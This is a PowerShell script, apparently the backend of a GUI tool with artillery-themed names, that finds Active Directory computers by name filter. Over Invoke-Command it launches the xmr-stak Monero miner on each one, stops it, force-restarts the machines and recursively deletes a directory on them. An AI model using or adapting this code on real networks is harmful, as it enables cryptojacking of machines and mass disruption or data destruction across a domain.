# Global Varibles

$searchBase = New-Object System.Collections.Generic.List[System.Object]

# Main Functions

function fireBase($outputPane, $progressBar) {

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
$opsDir = $missionParameters.ops
$filterTarget = $missionParameters.Target
$advanceParty = $missionParameters.ap
$searchbase = $missionParameters.search
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
showFireBase $outputPane

foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$outputPane.text += "Advance Party en-route to $client...`n"
$cmdstring = "invoke-command -computername $client -FilePath $advanceParty"
$scriptblock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-command $Scriptblock"

}

$outputPane.text += "`n`nBASE ESTABLISHED!"

}

function fireMission($outputPane, $progressBar) {

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
$searchbase = $missionParameters.search
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
showFireMission $outputPane
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$outputPane.text += "$client - Firing...`n"
$cmdstring = "invoke-command -computername $client -scriptblock {write-host 'I am' $client ; & ‘$opsDir\xmr-stak-win64\xmr-stak.exe’ -c '$opsDir\xmr-stak-win64\config.txt' -C '$opsDir\xmr-stak-win64\pools.txt'}"
$scriptBlock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-command  $Scriptblock"

}

$outputPane.text += "`n`nFIRE FOR EFFECT!"

}

function ceaseFire($outputPane, $progressBar) {

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
$searchbase = $missionParameters.search
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
showCeaseFire $outputPane

foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$outputPane.text += "$client - Clearing Breach...`n"
$cmdstring = "Invoke-Command -ComputerName $client -ErrorAction Continue -ScriptBlock { Stop-Process -Name xmr-stak }"
$scriptblock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-command  $Scriptblock"

}

$outputPane.text += "`n`nBREACHES CLEAR!"

} 

function cycleGunline($outputPane, $progressBar) {

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
$filterTarget = $missionParameters.Target
$searchbase = $missionParameters.search
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
foreach ($client in $hostList.Name)

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$outputPane.Text += "Sending command to $client...`n"
Invoke-Command $client -ErrorAction Continue -ScriptBlock { Restart-Computer -Force }
$outputPane.text += "`n`nGUNLINE CYCLED!"

}

#Get-Process -Name powershell | Where-Object -FilterScript { $_.Id -ne $PID } | Stop-Process -Passthru

} 

function getGrid($outputPane) {

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
showRedLeg $outputPane
$outputPane.text += "Organizational Unit(s): "
$outputPane.text += $missionParameters.search.Name
$outputPane.text += "`n`nSearch Base(s): "
$outputPane.text += $missionParameters.search.DistinguishedName
$outputPane.text += "`n`nTarget Filter String: "
$outputPane.text += $missionParameters.Target
$outputPane.text += "`n`nOperations Directory: "
$outputPane.text += $missionParameters.ops
$outputPane.text += "`n`nPayload: "
$outputPane.text += $missionParameters.payload
$outputPane.text += "`n`nAdvance Party: "
$outputPane.text += $missionParameters.ap

} 

function setGrid ($outputPane, $textBox_filter, $textBox_OpsDir) {

$filterTarget = $textBox_filter.text
$opsDir = $textBox_OpsDir.text
$configPath = "${psscriptroot}\fireDirectionalControl.json"
$advanceParty = "${psscriptroot}\advanceParty.ps1"
$storedSettings = @{

  ops = $opsDir
  payload = $opsDir
  ap = $advanceParty
  Target = $filterTarget
  search = $searchBase

}
$storedSettings | ConvertTo-Json | Out-File $configPath
showRedLeg $outputPane
$outputPane.text += "`n`nGrid Coordinates Set!"
Start-Sleep -s 3
showRedLeg $outputpane
reconGrid $outputpane

}

function pushGrid($outputPane, $textBox_OU) {

[string]$searchString = $textBox_OU.text
$selection = Get-ADObject -Filter "Name -eq '$searchString'" | ? {$_.objectclass -eq 'organizationalunit'} | Select Name, DistinguishedName
if (!($searchBase -match $selection)) { $searchBase.Add($selection) }
showGridCheck $outputpane
$outputPane.text += "Current Search Base Values:`n" 
$outputPane.text += $searchBase | ft | out-string

 }

function popGrid($outputPane, $textBox_OU) {


$searchBase.RemoveAt($searchBase.count - 1)
showGridCheck $outputpane
$outputPane.text += "Current Search Base Values:`n" 
$outputPane.text += $searchBase | ft | out-string

 }

function clearGrid($outputPane) { 

$searchBase.Clear()
showRedLeg $outputpane
$outputPane.text += "`nSearchBase is CLEAR!"
Start-Sleep -s 3
showRedLeg $outputpane
reconGrid $outputpane

}

function moveOut($outputPane, $progressBar) {

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
$searchbase = $missionParameters.search
$filterTarget = $missionParameters.Target
$opsDir = $missionParameters.ops
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name
showMoveOut $outputPane

foreach ($client in $hostList.Name) 

{

$counter++
[Int]$Percentage = ($counter/$hostList.count)*100
$ProgressBar.Value = $Percentage
$outputPane.text += "$client - Moving Out...`n"
$cmdstring = “invoke-command -computername $client -scriptblock { If(test-path $opsDir) { Remove-Item -path $opsDir -Recurse -Force }}”
$scriptblock = [scriptblock]::Create($cmdstring)
Start-Process powershell -ArgumentList "-command $Scriptblock"

}

$outputPane.text += "`n`nGUNLINE OUT!"

}

function cpuCheck($outputPane) {

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
$filterTarget = $missionParameters.Target
$searchbase = $missionParameters.search
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name

foreach ($client in $hostList.Name) {

$invokeCommandScriptBlock = {
    Get-WmiObject win32_processor | 
        Measure-Object -property LoadPercentage -Average | 
        Select-Object @{e={[math]::Round($_.Average,1)};n="CPU(%)"}
}

$invokeCommandArgs = @{
    ComputerName = $client
    ScriptBlock  = $invokeCommandScriptBlock
    ErrorAction  = "Continue"
}

$outputPane.text += Invoke-Command @invokeCommandArgs  | 
    Sort-Object "CPU(%)" -Descending | 
    Select-Object "CPU(%)",PSComputerName | Out-String

 }


 }

function gpuCheck($outputPane) {

$fireDirectionalControl = "${psscriptroot}\fireDirectionalControl.json"
$missionParameters = (Get-Content -Raw -Path $fireDirectionalControl | ConvertFrom-Json)
$filterTarget = $missionParameters.Target
$searchbase = $missionParameters.search
$hostList = $searchbase | ForEach-Object { Get-ADComputer -Filter "Name -like '$filterTarget'" -SearchBase $_.distinguishedname } | Select-Object Name

foreach ($client in $hostList.Name) {

$invokeCommandScriptBlock = { Get-WmiObject win32_VideoController | Select-Object PSComputerName, Name }
$invokeCommandArgs = @{

    ComputerName = $client
    ScriptBlock  = $invokeCommandScriptBlock
    ErrorAction  = "SilentlyContinue"

}

$outputPane.text += Invoke-Command @invokeCommandArgs  | out-string

}

}

function preflightCheck($outputPane) {

function versionCheck($outputPane) {

$currentVersion = $PSVersionTable.PSVersion
if ($currentVersion -lt 5.1)

{

  $outputPane.text += "Current Powershell Version is: $currentVersion`n"
  $outputPane.text += "Powershell Version is NO-GO AT THIS TIME!`n Please install Powershell 5.1 or greater`n"

}

else

{

  $outputPane.text += "Current Powershell Version is: $currentVersion`n"
  $outputPane.text += "Powershell Version is GO AT THIS TIME!`n`n"

}

}

function jsonCheck($outputPane) {

if (Test-Path "${psscriptroot}\fireDirectionalControl.json")

{

  $outputPane.text += "Config File Present`n`n"
  
}

else

{

  $outputPane.text += "Config File Needed`n`n"

}

}

versionCheck $outputPane
jsonCheck $outputPane

}

function reconGrid ($outputPane) {

$outputPane.text += "CURRENT RECON:`n"
$outputPane.text += Get-ADObject -Filter 'ObjectClass -eq "organizationalunit"’ | ft | out-string

}

# Sick ASCII art functions

function showFireBase($outputPane) { 

$logoASCIIfireBase = "
·▄▄▄▪  ▄▄▄  ▄▄▄ .      
▐▄▄·██ ▀▄ █·▀▄.▀·      
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄      
██▌.▐█▌▐█•█▌▐█▄▄▌      
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀       
▄▄▄▄·  ▄▄▄· .▄▄ · ▄▄▄ .
▐█ ▀█▪▐█ ▀█ ▐█ ▀. ▀▄.▀·
▐█▀▀█▄▄█▀▀█ ▄▀▀▀█▄▐▀▀▪▄
██▄▪▐█▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌
·▀▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀ 
"
$outputPane.text = $logoASCIIfireBase 

}

function showFireMission($outputPane) { 

$logoASCIIfireMission = "
·▄▄▄▪  ▄▄▄  ▄▄▄ .                     
▐▄▄·██ ▀▄ █·▀▄.▀·                     
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄                     
██▌.▐█▌▐█•█▌▐█▄▄▌                     
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀                      
• ▌ ▄ ·. ▪  .▄▄ · .▄▄ · ▪         ▐ ▄ 
·██ ▐███▪██ ▐█ ▀. ▐█ ▀. ██ ▪     •█▌▐█
▐█ ▌▐▌▐█·▐█·▄▀▀▀█▄▄▀▀▀█▄▐█· ▄█▀▄ ▐█▐▐▌
██ ██▌▐█▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▌▐█▌.▐▌██▐█▌
▀▀  █▪▀▀▀▀▀▀ ▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪
"
$outputPane.text = $logoASCIIfireMission 

}

function showCeaseFire($outputPane) { 

$logoASCIIceaseFire = "
 ▄▄· ▄▄▄ . ▄▄▄· .▄▄ · ▄▄▄ .
▐█ ▌▪▀▄.▀·▐█ ▀█ ▐█ ▀. ▀▄.▀·
██ ▄▄▐▀▀▪▄▄█▀▀█ ▄▀▀▀█▄▐▀▀▪▄
▐███▌▐█▄▄▌▐█ ▪▐▌▐█▄▪▐█▐█▄▄▌
·▀▀▀  ▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀ 
·▄▄▄▪  ▄▄▄  ▄▄▄ .          
▐▄▄·██ ▀▄ █·▀▄.▀·          
██▪ ▐█·▐▀▀▄ ▐▀▀▪▄          
██▌.▐█▌▐█•█▌▐█▄▄▌          
▀▀▀ ▀▀▀.▀  ▀ ▀▀▀           
"
$outputPane.text = $logoASCIIceaseFire 

}

function showCycleGunline($outputPane) { 

$logoASCIIreinitGunline = "
 ▄▄·  ▄· ▄▌ ▄▄· ▄▄▌  ▄▄▄ .        
▐█ ▌▪▐█▪██▌▐█ ▌▪██•  ▀▄.▀·        
██ ▄▄▐█▌▐█▪██ ▄▄██▪  ▐▀▀▪▄        
▐███▌ ▐█▀·.▐███▌▐█▌▐▌▐█▄▄▌        
·▀▀▀   ▀ • ·▀▀▀ .▀▀▀  ▀▀▀         
 ▄▄ • ▄• ▄▌ ▐ ▄ ▄▄▌  ▪   ▐ ▄ ▄▄▄ .
▐█ ▀ ▪█▪██▌•█▌▐███•  ██ •█▌▐█▀▄.▀·
▄█ ▀█▄█▌▐█▌▐█▐▐▌██▪  ▐█·▐█▐▐▌▐▀▀▪▄
▐█▄▪▐█▐█▄█▌██▐█▌▐█▌▐▌▐█▌██▐█▌▐█▄▄▌
·▀▀▀▀  ▀▀▀ ▀▀ █▪.▀▀▀ ▀▀▀▀▀ █▪ ▀▀▀ 
"
$outputPane.text = $logoASCIIreinitGunline 

}

function showGridCheck($outputPane){ 

$logoASCIIgridCheck = "
 ▄▄ • ▄▄▄  ▪  ·▄▄▄▄      
▐█ ▀ ▪▀▄ █·██ ██▪ ██     
▄█ ▀█▄▐▀▀▄ ▐█·▐█· ▐█▌    
▐█▄▪▐█▐█•█▌▐█▌██. ██     
·▀▀▀▀ .▀  ▀▀▀▀▀▀▀▀▀•     
 ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ 
▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪
██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·
▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌
·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀
"
$outputPane.text = $logoASCIIgridCheck 

}

function showMoveOut($outputPane) { 

$logoASCIImoveOut = "
• ▌ ▄ ·.        ▌ ▐·▄▄▄ .      ▄• ▄▌▄▄▄▄▄
·██ ▐███▪▪     ▪█·█▌▀▄.▀·▪     █▪██▌•██  
▐█ ▌▐▌▐█· ▄█▀▄ ▐█▐█•▐▀▀▪▄ ▄█▀▄ █▌▐█▌ ▐█.▪
██ ██▌▐█▌▐█▌.▐▌ ███ ▐█▄▄▌▐█▌.▐▌▐█▄█▌ ▐█▌·
▀▀  █▪▀▀▀ ▀█▄▀▪. ▀   ▀▀▀  ▀█▄▀▪ ▀▀▀  ▀▀▀ 
"
$outputPane.text = $logoASCIImoveOut 

}

function showRedLeg($outputPane) { 

$logoASCIIredLeg = "
▄▄▄  ▄▄▄ .·▄▄▄▄  ▄▄▌  ▄▄▄ . ▄▄ • 
▀▄ █·▀▄.▀·██▪ ██ ██•  ▀▄.▀·▐█ ▀ ▪
▐▀▀▄ ▐▀▀▪▄▐█· ▐█▌██▪  ▐▀▀▪▄▄█ ▀█▄
▐█•█▌▐█▄▄▌██. ██ ▐█▌▐▌▐█▄▄▌▐█▄▪▐█
.▀  ▀ ▀▀▀ ▀▀▀▀▀• .▀▀▀  ▀▀▀ ·▀▀▀▀ 
"
$outputPane.text = $logoASCIIredLeg

}